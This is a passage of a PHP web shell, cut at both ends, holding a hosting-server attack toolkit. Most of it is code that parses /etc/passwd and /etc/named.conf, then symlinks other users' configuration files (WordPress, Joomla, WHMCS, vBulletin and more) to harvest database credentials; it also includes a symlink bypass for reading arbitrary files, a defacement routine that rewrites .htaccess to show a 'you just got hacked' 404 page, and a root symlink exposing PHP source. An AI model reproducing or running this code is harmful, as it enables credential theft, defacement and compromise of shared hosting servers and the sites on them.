				   <?php if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					}  ?>
				   <td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
				   
                   <td class="info"><a href=javascript:void(0) onClick="fileaction('rename','<?php echo $vv; ?>')"><font size=2>Rename</font></a></td>
				   <td class="info"><a href="<?php echo $self;?>?download=<?php echo $dir . $directorysperator .$val;?>"><font size=2>Download</font></a>
				   <td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
                   </tr>
                   <p>
 			 <?php
      		}
		}
		
	echo "</table>
<div align='right' style='width:100%;' id=maindiv><BR><label><input type='checkbox' name='checkall' onclick='checkedAll();'> <font class=txt size=3>Check All </font></label> &nbsp;
<select class=sbox name=choice style='width: 100px;'>
			<option value=delete>Delete</option>
			<option value=chmod>Change mode</option>
			if(class_exists('ZipArchive'))
			{	<option value=compre>Compress</option>
			<option value=uncompre>Uncompress</option> }
		</select>
	
	<input type=button onClick=\"myaction(choice.value)\" value=Submit name=checkoption class=but></form></div>";
	}}
	else
    {
        echo "<p><font  size=3>".$_GET['dir']." is <b>NOT</b> a Valid Directory!<br /></font></p>";
    }

}
if(isset($_REQUEST["script"])) 
{
	$getpath = trim(dirname($_SERVER['SCRIPT_NAME']) . PHP_EOL);
	?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('manuallyscript')"><font class=txt size="4">| Do It Manually |</font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('scriptlocator')"><font class=txt size="4">| Do It Automatically |</font></a></td>
	</tr></table></center>
	<?php
}
else if(isset($_REQUEST['manuallyscript']))
{
	?>
		<center>
		<form action="<?php echo $self; ?>" method="post">
		<textarea class="box" rows="16" cols="100" name="passwd"></textarea><br>
		<input type="button" OnClick="manuallyscriptfn(passwd.value)" value="Get Config" class="but">
		</form>
		</center>
		<?php
}
else if(isset($_REQUEST['scriptlocator']))
{
	if(stristr(php_uname(),"Linux"))
	{
		$url = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
		$path=explode('/',$url);
		$url =str_replace($path[count($path)-1],'',$url);
		function syml($usern,$pdomain)
		{
			symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home/'.$usern.'/public_html/core/includes/config.php',$pdomain.'~~vBulletin5.txt');
			symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home/'.$usern.'/public_html/vb/core/includes/config.php',$pdomain.'~~vBulletin5.txt');
			symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb1.txt');
			symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home2/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb2.txt');
			symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home3/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb3.txt');
			symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home4/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb4.txt');
			symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb5.txt');
			symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb7.txt');
			symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		}
		if(isset($_REQUEST['passwd']))
		{
			$getetc = trim($_REQUEST['passwd']);
			
			mkdir("dhanushSPT");
			chdir("dhanushSPT");
					
			$myfile = fopen("test.txt","w");
			fputs($myfile,$getetc);
			fclose($myfile);
						 
			$file = fopen("test.txt", "r") or exit("Unable to open file!");
			while(!feof($file))
			{
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					syml($matches,$matches);
			}
			fclose($file);
			unlink("test.txt");
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."dhanushSPT target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		
		}
		else
		{
			$d0mains = @file("/etc/named.conf");
		if($d0mains)
		{
			mkdir("dhanushST");
			chdir("dhanushST");
								
			foreach($d0mains as $d0main)
			{
				if(eregi("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
							
					if(strlen(trim($domains[1][0])) > 2)
					{ 
						$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
									
						syml($user['name'],$domains[1][0]);					
					}
				}
			}
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."dhanushST target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		}
		else
		{
			mkdir("dhanushSPT");
			chdir("dhanushSPT");
			$temp = "";
			$val1 = 0;
			$val2 = 1000;
			for(;$val1 <= $val2;$val1++) 
			{
				$uid = @posix_getpwuid($val1);
				if ($uid)
					$temp .= join(':',$uid)."\n";
			 }
			 echo '<br/>';
			 $temp = trim($temp);
			 
			 $file5 = fopen("test.txt","w");
			 fputs($file5,$temp);
			 fclose($file5);
						 

			 $file = fopen("test.txt", "r") or exit("Unable to open file!");
			 while(!feof($file))
			 {
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
					continue;
				syml($matches,$matches);
			 }
			fclose($file);
			echo "</table>";
			unlink("test.txt");
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."dhanushSPT target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		}
	}
	}
	else
		echo "<center>Cannot Complete the task!!!!</center>";
	
}
else if(isset($_GET["symlinkfile"])) 
{
	if(!isset($_GET['file']))
	{
		?>
		<center>
			<form onSubmit="getdata('symlinkmyfile',file.value);return false;">
			<input type="text" class="box" name="file" size="50" value="/etc/passwd">
			<input type="button" value="Create Symlink" onClick="getdata('symlinkmyfile',file.value)" class="but">
			</form></center>
			<br><br>
		<?php
	}
}
 
else if(isset($_GET['symlinkmyfile']))
{
	if(stristr(php_uname(),"Linux"))
	{
		$fakedir="cx";
		$fakedep=16;
				
		$num=0; // offset of symlink.$num
				
		if(!empty($_GET['myfile']))
			$file=$_GET['myfile'];
		else $file="";
											
		if(empty($file))
		exit;
						
		if(!is_writable("."))
			echo "not writable directory";
					
		$level=0;
				
		for($as=0;$as<$fakedep;$as++)
		{
			if(!file_exists($fakedir))
				mkdir($fakedir);
				chdir($fakedir);
		}
						
		while(1<$as--) chdir("..");
				
		$hardstyle = explode("/", $file);
				
		for($a=0;$a<count($hardstyle);$a++)
		{
			if(!empty($hardstyle[$a]))
			{
				if(!file_exists($hardstyle[$a])) 
					mkdir($hardstyle[$a]);
					chdir($hardstyle[$a]);
					$as++;
			}
		}
			$as++;
			while($as--)
					chdir("..");
					
			@rmdir("fakesymlink");
			@unlink("fakesymlink");
					
			@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
					
			while(1)
			if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
			else $num++;
					
			@unlink("fakesymlink");
			mkdir("fakesymlink");
						
			echo '<CENTER>check symlink <a href="./symlink'.$num.'">symlink'.$num.'</a> file</CENTER>';
	}
	else
		echo '<CENTER>Cannot Create Symlink</CENTER>';		
}
else if(isset($_REQUEST['404new']))
{
	?>
	<form>
	<center><textarea name=message cols=100 rows=18 class=box>lol! You just got hacked</textarea></br>
	<input type="button" onClick="my404page(message.value)" value="  Save  " class=but></center>
	</br>
	</form>
	<?php
}
else if(isset($_REQUEST['404page']))
{
	$url = $_SERVER['REQUEST_URI'];
	$path=explode('/',$url);
	$url =str_replace($path[count($path)-1],'',$url);
	if(isset($_POST['message']))
	{
		if($myfile = fopen(".htaccess", "a"))
		{
			fwrite($myfile, "ErrorDocument 404 ".$url."404.html \n\r"); 
			if($myfilee = fopen("404.html", "w+"))
			{
				fwrite($myfilee, $_POST['message']);
			}
			echo "<center><font class=txt>Done setting 404 Page !!!!</font></center>";
		}
			else
				echo "<center>Cannot Set 404 Page</center>";
	}
	else if(strlen($ind) != 0)
	{
		if($myfile = fopen(".htaccess", "a"))
		{
			fwrite($myfile, "ErrorDocument 404 ".$url."404.html \n\r"); 
	
			if($myfilee = fopen("404.html", "w+"))
			{
				fwrite($myfilee, base64_decode($ind));
			
				fclose($myfilee);
				echo "<center><font class=txt>Done setting 404 Page !!!!</font></center>";
			}
			fclose($myfile);	
		}
		else
		{
			echo "<center>Cannot Set 404 Page</center>";
		}
	}
	else
		echo "<center>Nothing Specified in the shell</center>";
}
else if(isset($_GET["domains"])) 
{
	?><center><iframe src="<?php echo 'http://sameip.org/ip/' . getenv('SERVER_ADDR'); ?>" width="80%" height="1000px"></iframe></center><?php 
}
else if(isset($_GET["symlink"])) 
{
	$d0mains = @file("/etc/named.conf");
	$url = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
	$path=explode('/',$url);
	$url =str_replace($path[count($path)-1],'',$url);
	if($d0mains)
	{ 
   		@mkdir("dhanush",0777);
		@chdir("dhanush");
		execmd("ln -s / root");
		$file3 = 'Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any        
	';
		$fp3 = fopen('.htaccess','w');
		$fw3 = fwrite($fp3,$file3);
		@fclose($fp3);
